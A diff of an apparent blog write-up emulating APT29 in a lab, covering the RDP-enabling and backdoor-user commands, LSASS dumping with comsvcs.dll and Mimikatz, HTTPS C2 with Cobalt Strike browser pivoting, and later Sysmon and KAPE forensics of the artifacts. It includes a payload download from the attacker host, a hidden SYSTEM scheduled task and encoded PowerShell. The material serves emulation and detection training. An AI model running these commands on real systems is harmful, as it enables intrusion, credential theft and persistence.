-Remote Desktop Protocol (RDP) is a native Windows remote administration service commonly abused by threat actors to achieve lateral movement and full interactive access inside compromised environments.
+## 5 · T1021.001 — Remote Desktop Protocol
 
-APT29 (Cozy Bear / The Dukes), a highly sophisticated state-sponsored threat group, is known for leveraging valid credentials and built‑in Windows remote services to blend in with legitimate administrative activity.
+APT29 leverages valid credentials and built-in Windows remote services to blend in with legitimate administration. The group avoids noisy brute-force, preferring valid domain credentials obtained via **credential dumping (LSASS)**, **Kerberoasting**, or **OAuth-token abuse**, then performs stealthy lateral movement over **RDP**.
 
-APT29 avoids noisy brute‑force techniques and instead focuses on obtaining valid domain credentials through credential dumping (LSASS access), Kerberoasting, or abuse of OAuth tokens. After acquiring legitimate accounts, the group performs stealthy lateral movement using RDP to pivot deeper inside the network.
+#### Simulation Section
 
-### Simulation Section
+**1. Enable RDP and open the firewall (as APT29 does):**
+```powershell
+reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
+```
+```bat
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+```
 
-First lets open RDP Service and Open FW as they always do powershell reg add "HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f powershell netsh advfirewall firewall set rule group="remote desktop" new enable=Yes shell reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+<img src="/assets/img/posts/apt29-hunting/img-103.png" width="420" alt="enable RDP"/>
 
-![](/assets/img/posts/apt29-hunting/img-100.png)
+**2. Create a user (to make forensics clearer):** `APT29` / `m******` (came in as Admin from the earlier elevated beacon).
 
-![](/assets/img/posts/apt29-hunting/img-101.png)
+**3. Open the RDP firewall port:**
+```bat
+netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+```
 
-Now lets create a user to make it more clear in forensics section
+**4. Disable NLA (reduce auth noise when connecting from Kali):**
+```bat
+reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+```
 
-User Name: APT29
+**5. Add the user to the RDP group:**
+```bat
+net localgroup "Remote Desktop Users" APT29 /add
+```
 
-Password: m*
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-107.png" width="380" alt="create user"/></td><td><img src="/assets/img/posts/apt29-hunting/img-109.png" width="380" alt="rdp users"/></td></tr>
+<tr><td colspan="2"><img src="/assets/img/posts/apt29-hunting/img-110.png" width="380" alt="rdp config"/></td></tr>
+</table>
 
-![](/assets/img/posts/apt29-hunting/img-102.png)
+**6. Connect over RDP from Kali** using `xfreerdp3`:
+```bash
+xfreerdp3 /f /u:APT29 /p:****** /v:192.168.253.147
+```
 
-![](/assets/img/posts/apt29-hunting/img-103.png)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-111.png" width="360" alt="rdp connect"/></td><td><img src="/assets/img/posts/apt29-hunting/img-112.png" width="360" alt="rdp session"/></td><td><img src="/assets/img/posts/apt29-hunting/img-113.png" width="360" alt="rdp session"/></td></tr>
+</table>
 
-Came as an Admin for Beacon we ran as an admin previously lets open RDP protocol:
+---
 
-shell netsh advfirewall firewall add rule name="RDP" dir=in action=allow protocol=TCP localport=3389
+## 6 · T1003.001 — LSASS Memory Dumping
 
-![](/assets/img/posts/apt29-hunting/img-104.png)
+One of the most critical stages in the APT29 chain is harvesting authentication material directly from the **Local Security Authority Subsystem Service (LSASS)** — yielding cached credentials, **NTLM hashes**, **Kerberos tickets**, and tokens for lateral movement, privilege escalation, and persistence.
 
-Lets disable NLA to avoid any security noisy while logging from Kail shell reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+APT29 uses multiple LSASS-dumping techniques depending on the stealth required. Common approaches:
 
-![](/assets/img/posts/apt29-hunting/img-105.png)
+- Cobalt Strike's built-in **`procdump`** module.
+- **`rundll32.exe` loading `comsvcs.dll`** (frequently observed in APT29 ops).
+- Stealthy tools such as **NanoDump** to bypass EDR/ETW.
 
-Add user to RDP Users list:
+#### Simulation Section
 
-shell net localgroup "Remote Desktop Users" APT29 /add
+Ensure the beacon is **High Integrity** (`getuid`), then locate `lsass.exe` with the `ps` command.
 
-![](/assets/img/posts/apt29-hunting/img-106.png)
+<img src="/assets/img/posts/apt29-hunting/img-115.png" width="420" alt="ps lsass"/> <img src="/assets/img/posts/apt29-hunting/img-116.png" width="420" alt="ps lsass"/>
 
-![](/assets/img/posts/apt29-hunting/img-107.png)
+**Living-off-the-land via `comsvcs.dll`:**
 
-![](/assets/img/posts/apt29-hunting/img-108.png)
+| Field | Value |
+|-------|-------|
+| **DLL path** | `C:\Windows\System32\comsvcs.dll` (COM+ Services DLL) |
+| **Function** | `MiniDump` — converts any process memory to a dump file (officially used by Microsoft for debugging) |
+| **Method** | `rundll32.exe` → `comsvcs.dll, MiniDump` |
 
-The waited moment, its RDP connection
+LSASS is protected by `SeDebugPrivilege`, `SeAssignPrimaryTokenPrivilege`, and `SeTcbPrivilege` — **Admin alone is not enough; SYSTEM access is required.**
 
-I will use xfreerdp3 built in kali tool xfreerdp3 /f /u:APT29 /p##### /v:192.168.253.147
+Here the hashes are dumped and **Mimikatz** is run directly from Cobalt Strike to save time (cracking steps to follow later).
 
-![](/assets/img/posts/apt29-hunting/img-109.png)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-117.png" width="380" alt="lsass dump"/></td><td><img src="/assets/img/posts/apt29-hunting/img-118.png" width="380" alt="lsass dump"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-121.png" width="380" alt="mimikatz"/></td><td><img src="/assets/img/posts/apt29-hunting/img-122.png" width="380" alt="mimikatz"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-119.png" width="380" alt="lsass dump"/></td><td><img src="/assets/img/posts/apt29-hunting/img-123.png" width="380" alt="mimikatz"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-124.png" width="380" alt="mimikatz output"/></td><td><img src="/assets/img/posts/apt29-hunting/img-125.png" width="380" alt="mimikatz output"/></td></tr>
+</table>
 
-And here we are :)
+---
 
-![](/assets/img/posts/apt29-hunting/img-110.png)
+## 7 · T1071.001 — Web Protocols (C2)
 
-![](/assets/img/posts/apt29-hunting/img-111.png)
+APT29 extensively uses **HTTP/HTTPS** for covert Command-and-Control, crafted to resemble legitimate browser traffic: realistic User-Agent headers, encrypted payloads inside standard HTTP fields, and benign-looking URL structures. The group often relays C2 and exfiltration through cloud services like **GitHub** and **Dropbox**, and uses **beacon jitter** and randomized timing to defeat behavioral detection.
 
-![](/assets/img/posts/apt29-hunting/img-112.png)
+**Covert C2 over HTTPS (443)** hides tasking instructions, beacon metadata, and exfiltrated data — and because HTTPS encrypts the payload, defenders cannot inspect contents.
 
-![](/assets/img/posts/apt29-hunting/img-113.png)
+| Aspect | APT29 pattern |
+|--------|---------------|
+| **Realistic paths** | `/favicon.ico`, `/login/validate`, `/update`, `/wp-content/uploads/` |
+| **Domains** | Mimic cloud/corporate sites; sometimes compromised servers with valid HTTPS certs |
+| **HTTP methods** | `GET` (retrieve commands), `POST` (return results/stolen data), `HEAD`/`OPTIONS` (keep-alive) |
+| **Header smuggling** | `Cookie:` (encrypted data), `User-Agent:` (malware version), `X-Session-ID:` (beacon ID), `Authorization:` (session keys) |
 
-## T1003.001 "OS Credential Dumping: LSASS Memory*
+Example header:
+```http
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
+Cookie: sessionId=gh4j2k1… ; data=base64_payload
+```
 
-One of the most critical stages in the APT29 attack chain involves harvesting authentication material directly from the Local Security Authority Subsystem Service (LSASS). By dumping LSASS memory, the actor gains access to cached credentials, NTLM hashes, Kerberos tickets, and tokens—enabling lateral movement, privilege escalation, and long‑term persistence inside the environment.
+> ⚠️ **Tell-tale:** browser-like traffic originating from **non-browser processes** — `rundll32.exe`, `wermgr.exe`, `powershell.exe`, `msbuild.exe`, or `svchost.exe` not associated with web-service roles.
 
-APT29 is known for leveraging multiple LSASS dumping techniques depending on the level of stealth required. In our simulation, we replicated their workflow using Cobalt Strike, focusing on low‑noise methods consistent with real‑world tradecraft.
+#### Simulation Section
 
-Once the attacker obtains a high‑integrity foothold on the compromised host, LSASS dumping is performed through controlled memory extraction. Common approaches include:
+Create a new listener over **HTTPS (443)** and a payload named after the MITRE ID `T1071.001`. On the listener, choose **Browser Pivot**.
 
-Using Cobalt Strike’s built‑in procdump module.
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-129.png" width="400" alt="https listener"/></td><td><img src="/assets/img/posts/apt29-hunting/img-130.png" width="400" alt="https listener"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-131.png" width="400" alt="browser pivot"/></td><td></td></tr>
+</table>
 
-Triggering a dump through rundll32.exe loading comsvcs.dll (often observed in APT29 operations).
+Now the victim's traffic flows through the proxy.
 
-Employing stealthy tools such as NanoDump to bypass EDR and ETW monitoring.
+> **Beacon vs. Browser Pivot.** A **Beacon** can issue raw HTTP (GET/POST, up/downloads) — good for recon, HTTP scanning, and covert exfiltration — but **cannot** render pages, run JavaScript, or touch the DOM. **Browser Pivoting** routes the victim's real browser (Edge/Firefox) through the Beacon, enabling full browser-based attacks with the victim's **authenticated session**: accessing internal web apps, stealing cookies/tokens, CSRF/JS injection, and browsing internal portals.
 
-### Simulation Section
+Quick tests (these fail here as there's no real target web server):
 
-First make sure ur beacon is in High Integrity as always lets try getuid:
-
-![](/assets/img/posts/apt29-hunting/img-114.png)
-
-no we want to dump the credentials from lsass.exe process first lets find it on the machine using ps command
-
-![](/assets/img/posts/apt29-hunting/img-115.png)
-
-![](/assets/img/posts/apt29-hunting/img-116.png)
-
-![](/assets/img/posts/apt29-hunting/img-117.png)
-
-![](/assets/img/posts/apt29-hunting/img-118.png)
-
-APT29 was using a method called (rundll32.exe > comsvcs.dll)
-
-File Path: C:\Windows\System32\comsvcs.dll
-
-![](/assets/img/posts/apt29-hunting/img-119.png)
-
-will use rundll32.exe to apply Living Off The Land comsvcs.dll (COM+ Services DLL)
-
-This dll has a function called MiniDump which can be used to dump any process memory
-
-It used officially by Microsoft for debugging
-
-MiniDump converts any process memory to dump files
-
-Native Code lsass.exe protected by multiple functions:
-
-SeDebugPrivilege
-
-SeAssignPrimaryTokenPrivilege
-
-SeTcbPrivilege so here admin will not be enough, here we need SYSTEM access
-
-![](/assets/img/posts/apt29-hunting/img-120.png)
-
-I will dump the hashes and run mimikatz directly from cobalt strike to save time
-
-![](/assets/img/posts/apt29-hunting/img-121.png)
-
-![](/assets/img/posts/apt29-hunting/img-122.png)
-
-![](/assets/img/posts/apt29-hunting/img-123.png)
-
-![](/assets/img/posts/apt29-hunting/img-124.png)
-
-![](/assets/img/posts/apt29-hunting/img-125.png)
-
-will continue cracking steps also later
-
-## T1071.001 "Application Layer Protocol: Web Protocols"
-
-APT29 extensively leverages HTTP and HTTPS (T1071.001) to establish covert Command-and-Control channels. Their web traffic is intentionally crafted to resemble legitimate browser communications by using realistic User-Agent headers, encrypted payloads within standard HTTP fields, and benign-looking URL structures.
-
-The group often uses cloud services such as GitHub and Dropbox as relays for C2 tasking and exfiltration. APT29 also employs beacon jitter and randomized timing to avoid behavioral detection, making their web-based C2 channels exceptionally difficult for defenders to identify
-
-Covert C2 over HTTPS
-
-APT29 regularly uses HTTPS (port 443) for encrypted communication, which hides:
-
-Tasking instructions
-
-Beacon metadata
-
-Exfiltrated data
-
-Because HTTPS encrypts the payload, defenders cannot inspect the contents.
-
-APT29 makes their C2 traffic visually identical to normal browser traffic:
-
-Realistic paths:
-
-/favicon.ico
-
-/login/validate
-
-/update
-
-/wp-content/uploads/
-
-Legitimate-looking domains:
-
-Often mimic cloud services or corporate websites
-
-Sometimes use compromised servers with valid HTTPS certificates
-
-Common HTTP methods:
-
-GET for retrieving commands
-
-POST for returning results or stolen data
-
-HEAD/OPTIONS for keep-alive or health checks
-
-APT29 embeds C2 messages inside HTTP headers to avoid payload inspection.
-
-Common patterns seen in past operations:
-
-Cookie: exfiltrated/encrypted data
-
-User-Agent: identifies the malware version
-
-X-Session-ID: beacon ID
-
-Authorization: session keys
-
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) Cookie: sessionId=gh4j2k1… ; data=base64_payload
-
-Browser-like traffic originating from non-browser processes
-
-Examples:
-
-rundll32.exe wermgr.exe powershell.exe msbuild.exe svchost.exe not associated with web service roles
-
-### Simulation Section
-
-Lets create new listener over HTTPS (443)
-
-![](/assets/img/posts/apt29-hunting/img-126.png)
-
-will create the payload with same name of MITRE ID "T1071.001"
-
-![](/assets/img/posts/apt29-hunting/img-127.png)
-
-![](/assets/img/posts/apt29-hunting/img-128.png)
-
-click on the listener then choose "Browser Pivot"
-
-![](/assets/img/posts/apt29-hunting/img-129.png)
-
-Will find the following
-
-![](/assets/img/posts/apt29-hunting/img-130.png)
-
-![](/assets/img/posts/apt29-hunting/img-131.png)
-
-Now the victim's traffic will flow in the proxy :)
-
-When performing web attacks through Cobalt Strike, it's important to understand the distinction between actions performed directly from the Beacon and those executed through a Browser Pivot. A Beacon can issue raw HTTP requests, such as GET, POST, and file uploads or downloads, which makes it useful for tasks like basic reconnaissance, HTTP‑based scanning, and covert data exfiltration. However, a Beacon cannot render webpages, execute JavaScript, or interact with the DOM, which means it cannot perform advanced web attacks on its own. In contrast, Browser Pivoting leverages the victim’s actual web browser (such as Edge or Firefox) and silently routes all of its traffic through the Beacon. This allows the operator to conduct full‑fledged web attacks using the victim’s authenticated session, including accessing internal web applications, stealing cookies or tokens, performing CSRF or JavaScript injections, and browsing internal portals that would otherwise be inaccessible. In short, the Beacon can generate low‑level web traffic, but Browser Pivoting unlocks full browser‑based attacks that require real session context, rendering capability, and user authentication.
-
-Will use quick test (here we don't the attack on official web server so the results fail)
-
-Check for http://target.local/ powershell Invoke-WebRequest http://target.local/
-
-![](/assets/img/posts/apt29-hunting/img-132.png)
-
-Run it in silent mode powershell "$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://target.local')"
-
-Invoke-RestMethod (API Testing)
-
+```powershell
+powershell Invoke-WebRequest http://target.local/
+powershell "$wc = New-Object System.Net.WebClient; $wc.DownloadString('http://target.local')"
 powershell Invoke-RestMethod -Uri "http://target.local/api"
-
-Curl attempt run curl http://target.local/
-
-![](/assets/img/posts/apt29-hunting/img-133.png)
-
+curl http://target.local/
 powershell Invoke-WebRequest http://192.168.1.10/
+```
 
-![](/assets/img/posts/apt29-hunting/img-134.png)
+<img src="/assets/img/posts/apt29-hunting/img-132.png" width="380" alt="web test"/> <img src="/assets/img/posts/apt29-hunting/img-133.png" width="380" alt="web test"/> <img src="/assets/img/posts/apt29-hunting/img-134.png" width="380" alt="web test"/>
 
-The Intel471 article (Threat Hunting Case Study: Cozy Bear) clearly aligns with T1071.001 Web Protocols even if the article doesn’t explicitly mention the technique ID
+**Intel471 correlation** — the *Threat Hunting Case Study: Cozy Bear* report aligns with T1071.001 even without naming the ID, citing HTTP-based C2, HTTPS data exfiltration, and web-request payload delivery. Indicators: repeated HTTP GET/POST to unusual endpoints with randomized URL paths; slightly-off User-Agent strings; small, frequent HTTPS POSTs that don't match normal traffic volume.
 
-The Intel471 report states that Cozy Bear uses:
+> 📎 Reference: <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>
 
-HTTP-based command and control
+---
 
-HTTPS-based data exfiltration
+## 8 · Forensics & DFIR
 
-Web request–based payload delivery
+This section reconstructs the emulated intrusion from host artifacts.
 
-Indicators in the Intel471 report:
+### 8.1 Event Logs & Sysmon
 
-Repeated HTTP GET/POST to unusual endpoints with randomized URL paths.
+**Extract the event logs:**
+```text
+Security.evtx        C:\Windows\System32\winevt\Logs\Security.evtx
+PowerShell Operational  C:\Windows\System32\winevt\Logs\Microsoft-Windows-PowerShell%4Operational.evtx
+```
 
-Suspicious User-Agent strings, sometimes slightly off from default browser ones.
+**Sysmon events leveraged:**
 
-Small, frequent HTTPS POSTs that do not match normal web traffic volume patterns.
+| Sysmon Event ID | Meaning |
+|-----------------|---------|
+| **1** | Process Create |
+| **3** | Network Connection |
+| **7** | Image Loaded (DLL beacon) |
+| **11** | File Create |
+| **13** | Registry Set |
 
-> **Ref:** <https://www.intel471.com/blog/threat-hunting-case-study-cozy-bear>
+#### Sysmon Event ID 1 — Process Creation (filter `rundll32.exe`)
 
-Forensics Section:
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-135.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-136.png" width="380" alt="sysmon evt1"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-137.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-138.png" width="380" alt="sysmon evt1"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-139.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-140.png" width="380" alt="sysmon evt1"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-143.png" width="380" alt="sysmon evt1"/></td><td><img src="/assets/img/posts/apt29-hunting/img-144.png" width="380" alt="encoded ps"/></td></tr>
+</table>
 
-First lets start with security events:
-
-First lets extract these events files:
-
-Security.evtx
-
-C:\Windows\System32\winevt\Logs\Security.evtx
-
-![](/assets/img/posts/apt29-hunting/img-135.png)
-
-Operational.evtx
-
-C:\Windows\System32\winevt\Logs\Microsoft-Windows- PowerShell%4Operational.evtx
-
-![](/assets/img/posts/apt29-hunting/img-136.png)
-
-Also i did the setup of sysmon previously, it will help us in:
-
-Event ID 1: Process Create
-
-Event ID 3: Network Connections
-
-Event ID 7: Image Loaded (DLL beacon)
-
-Event ID 11: File Create
-
-Event ID 13: Registry Set
-
-![](/assets/img/posts/apt29-hunting/img-137.png)
-
-![](/assets/img/posts/apt29-hunting/img-138.png)
-
-Lets start with Sysmon:
-
-Will start with Event ID 1 (Process Creation)
-
-![](/assets/img/posts/apt29-hunting/img-139.png)
-
-we will filter with "rundll32.exe"
-
-![](/assets/img/posts/apt29-hunting/img-140.png)
-
-![](/assets/img/posts/apt29-hunting/img-141.png)
-
-![](/assets/img/posts/apt29-hunting/img-142.png)
-
-Then you will find event describes the following:
-
+```text
 Initiated Process: rundll32.exe
+Process Tree:      4344.exe > rundll32.exe
+Process Path:      C:\Users\Victim-Machine\Desktop\4344.exe   (C2 Beacon)
 
-Process Tree: 4344.exe > rundll32.exe
-
-Process Path: C:\Users\Victim-Machine\Desktop\4344.exe ( C2 Beacon )
-
-![](/assets/img/posts/apt29-hunting/img-143.png)
-
-Also we can see DLL beacon file which came from DLL connections:
-
-File: APT29.dll
-
-File Path: C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
-
-CommandLine: rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
-
-Commands Done by this Dll:
-
-PowerShell Encoding Attempts:
-
-powershell -nop -exec bypass -EncodedCommand
-
-RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA== powershell -nop -exec bypass -EncodedCommand
-
-RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AG UAcgBTAHkAcwB0AGUAbQA= powershell -nop -exec bypass -EncodedCommand
-
-RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwA= powershell -nop -exec bypass -EncodedCommand dwBoAG8AYQBtAGkA powershell -nop -exec bypass -EncodedCommand cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAIgBTAHkAcwB0AG
-
-```
-UAbQBVAHAAZABhAHQAZQAiACAALwB0AHIAIAAiAHAAbwB3AGUAcgBzAGgAZQBsAGwALgBl
-AHgAZQAgAC0ATgBvAFAAcgBvAGYAaQBsAGUAIAAtAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQ
-AgAEgAaQBkAGQAZQBuACAALQBFAHgAZQBjAHUAdABpAG8AbgBQAG8AbABpAGMAeQAgAEIA
-eQBwAGEAcwBzACAALQBGAGkAbABlACAAIgBDADoAXABVAHMAZQByAHMAXABWAGkAYwB0AG
-kAbQAtAE0AYQBjAGgAaQBuAGUAXABEAGUAcwBrAHQAbwBwAFwAQQBQAFQALQBzAGgAdABh
-AHMAawAuAHAAcwAxACIAIAAvAHMAYwAgAGgAbwB1AHIAbAB5ACAALwByAHUAIABTAFkAUw
-BUAEUATQA=
+DLL beacon:        APT29.dll
+DLL path:          C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
+CommandLine:       rundll32 C:\Users\Victim-Machine\Desktop\APT29.dll,StartW
 ```
 
-powershell -nop -exec bypass -EncodedCommand
+**Encoded PowerShell attempts** captured (Base64-encoded UTF-16LE):
 
+```text
+powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBOAGUAdABUAEMAUABDAG8AbgBuAGUAYwB0AGkAbwBuAA==
+   → Get-NetTCPConnection
+powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAFcAaQBuADMAMgBfAEMAbwBtAHAAdQB0AGUAcgBTAHkAcwB0AGUAbQA=
+   → Get-WmiObject Win32_ComputerSystem
+powershell -nop -exec bypass -EncodedCommand RwBlAHQALQBOAGUAdABJAFAAQQBkAGQAcgBlAHMAcwA=
+   → Get-NetIPAddress
+powershell -nop -exec bypass -EncodedCommand dwBoAG8AYQBtAGkA
+   → whoami
+powershell -nop -exec bypass -EncodedCommand cwBjAGgAdABhAHMAawBzAC...   → schtasks /create /tn "SystemUpdate" ...
 ```
-cwBjAGgAdABhAHMAawBzACAALwBjAHIAZQBhAHQAZQAgAC8AdABuACAAUwB5AHMAdABlAG
-0AVQBwAGQAYQB0AGUAIAAvAHQAcgAgACIAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABl
-ACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASA
-BpAGQAZABlAG4AIAAtAEUAeABlAGMAdQB0AGkAbwBuAFAAbwBsAGkAYwB5ACAAQgB5AHAA
-YQBzAHMAIAAtAEYAaQBsAGUAIABDADoAXABcAFUAcwBlAHIAcwBcAFwAVgBpAGMAdABpAG
-0ALQBNAGEAYwBoAGkAbgBlAFwAXABEAGUAcwBrAHQAbwBwAFwAXABBAFAAVAAtAHMAaAB0
-AGEAcwBrAC4AcABzADEAIgAgAC8AcwBjACAAaABvAHUAcgBsAHkAIAAvAHIAdQAgAFMAWQ
-BTAFQARQBNACAALwBmAA==
+
+<img src="/assets/img/posts/apt29-hunting/img-142.png" width="420" alt="encoded powershell"/> <img src="/assets/img/posts/apt29-hunting/img-145.png" width="420" alt="encoded powershell"/>
+
+Persistence-related artifacts from `APT29.dll`:
+```text
+C:\Windows\system32\cmd.exe /C upload /home/kali/Desktop/APT-shtask.ps1   (upload from Kali)
+C:\Users\Victim-Machine\Desktop\APT-shtask.ps1                            (file path)
 ```
 
-![](/assets/img/posts/apt29-hunting/img-144.png)
+**PowerShell.exe analysis — focus on `Payload Data4`.** Observed process trees:
+```text
+rundll32.exe       > APT29.dll        > powershell.exe   (DLL Beacon)
+OneDrive.exe       > powershell.exe                      (old C2 test beacon)
+4344.exe           > powershell.exe                      (4344 beacon)
+T1071.001.exe      > powershell.exe                      (T1071.001 beacon)
+HEALTHY_STITCH.exe > powershell.exe                      (old C2 test beacon)
+```
 
-Attempt from APT.29 dll file to make the persistence:
+<img src="/assets/img/posts/apt29-hunting/img-146.png" width="400" alt="powershell trees"/>
 
-C:\Windows\system32\cmd.exe /C upload /home/kali/Desktop/APT- shtask.ps1 (Upload Attempt From Kali)
-
-C:\Users\Victim-Machine\Desktop\APT-shtask.ps1 (File Path)
-
-Now lets go to powershell.exe
-
-![](/assets/img/posts/apt29-hunting/img-145.png)
-
-Here we can see a huge amount of all powershell commands used in our simulations of course parent will appear to be as powershell.exe, so here we will focus on Payload Data4 Section only:
-
-![](/assets/img/posts/apt29-hunting/img-146.png)
-
-Process Trees:
-
-rundll32.exe > APT29.dll > powershell.exe (DLL Beacon)
-
-OneDrive.exe > powershell.exe (Old C2 Beacon for Testing)
-
-4344.exe > powershell.exe (4344 beacon)
-
-## T1071.001.exe > powershell.exe (T1071.001 beacon)
-
-HEALTHY_STITCH.exe > powershell.exe (Old C2 Beacon for Testing)
-
-### Commands
-
-![](/assets/img/posts/apt29-hunting/img-147.png)
-
-![](/assets/img/posts/apt29-hunting/img-148.png)
-
-Invoke-WebRequest 'http://192.168.253.148:8080/FUTURE_GARAGE.exe' - OutFile FUTURE.exe whoami hostname ipconfig powershell.exe -args Get-Process (ps beacon command)
-
-whoami /groups iwr http://192.168.253.148/test.txt -OutFile C:\Users\Public\test.txt
-
+**Commands observed:**
+```text
+Invoke-WebRequest 'http://192.168.253.148:8080/FUTURE_GARAGE.exe' -OutFile FUTURE.exe
+whoami ; hostname ; ipconfig ; whoami /groups
+powershell.exe -args Get-Process
+iwr http://192.168.253.148/test.txt -OutFile C:\Users\Public\test.txt
 "C:\Windows\system32\runas.exe" /user:Administrator cmd
-
-```
-schtasks.exe" /create /tn SystemUpdate /tr "powershell.exe -NoProfile -
-WindowStyle Hidden -ExecutionPolicy Bypass -File
-C:\Users\Public\upd.ps1" /sc hourly /ru SYSTEM
+schtasks.exe /create /tn SystemUpdate /tr "powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Public\upd.ps1" /sc hourly /ru SYSTEM
+reg ... HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
+"powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1
 ```
 
-HKLM:\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+<img src="/assets/img/posts/apt29-hunting/img-147.png" width="380" alt="commands"/> <img src="/assets/img/posts/apt29-hunting/img-148.png" width="380" alt="commands"/>
 
-"powershell.exe" -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass - File C:\Users\Victim-Machine\Desktop\APT-shtask.ps1
+#### Sysmon Event ID 3 — Network Connection
 
-Other encoded commands discussed above if we use schtasks.exe we will find the same:
+| Field | Value |
+|-------|-------|
+| **User** | `DESKTOP-M8AP5P7\Victim-Machine` |
+| **User SID** | `S-1-5-21-1064308082-3896131167-3449499780-1001` |
+| **Source host** | `DESKTOP-M8AP5P7` |
+| **RuleName** | User Mode |
+| **Destination IP** | `192.168.253.148` (Kali) |
+| **Initiating processes** | `rundll32.exe`, `T1071.001.exe`, `OneDrive.exe`, `4344.exe` |
 
-![](/assets/img/posts/apt29-hunting/img-149.png)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-149.png" width="380" alt="evt3"/></td><td><img src="/assets/img/posts/apt29-hunting/img-150.png" width="380" alt="evt3"/></td></tr>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-151.png" width="380" alt="evt3"/></td><td><img src="/assets/img/posts/apt29-hunting/img-152.png" width="380" alt="evt3"/></td></tr>
+</table>
 
-I will not waste time here tbh lets go the next
+#### Sysmon Event ID 11 — File Creation
 
-Second lets move to Event ID 3: (Network Connection)
+`APT-shtask.ps1` was created by `rundll32.exe`. (The file was also transferred directly during simulation to save time.)
 
-![](/assets/img/posts/apt29-hunting/img-150.png)
+<img src="/assets/img/posts/apt29-hunting/img-158.png" width="420" alt="evt11 file create"/>
 
-First thing we must check is the connection details between Attacker and Victim:
+#### PowerShell Script-Block Logging
 
-User
+```powershell
+Set-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging -Name EnableScriptBlockLogging -Value 1 -Force
+New-Item -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -Force | Out-Null
+```
 
-User SID
+<img src="/assets/img/posts/apt29-hunting/img-163.png" width="400" alt="scriptblock logging"/> <img src="/assets/img/posts/apt29-hunting/img-164.png" width="400" alt="scriptblock logging"/>
 
-Source IP
+### 8.2 KAPE Triage
 
-Source Host Name
+Two modules were used: **MiniTimelineCollection** and **!SANS_Triage**.
 
-RuleName
+```text
+.\kape.exe --tsource C: --tdest "C:\Users\Victim-Machine\Desktop\Kape Results" --tflush --target !SANS_Triage,MiniTimelineCollection --gui
+```
 
-Destination IP
+<img src="/assets/img/posts/apt29-hunting/img-162.png" width="220" alt="KAPE"/>
 
-Initiating Process
+#### $MFT — Master File Table
 
-CommandLine
+Parse `$MFT` to CSV with **MFTECmd**:
+```text
+MFTECmd.exe -f "C:\Users\Subzero\Desktop\$MFT" --csv "C:\Users\Subzero\Desktop"
+```
+Open in **Timeline Explorer**.
 
-![](/assets/img/posts/apt29-hunting/img-151.png)
+<table>
+<tr><td><img src="/assets/img/posts/apt29-hunting/img-166.png" width="380" alt="MFT"/></td><td><img src="/assets/img/posts/apt29-hunting/img-167.png" width="380" alt="MFT timeline"/></td></tr>
+</table>
 
-![](/assets/img/posts/apt29-hunting/img-152.png)
+**Key artifacts from `$MFT`:**
 
-Lets Answer Each Question:
+| File | Created | Modified | Last Access | Notes |
+|------|---------|----------|-------------|-------|
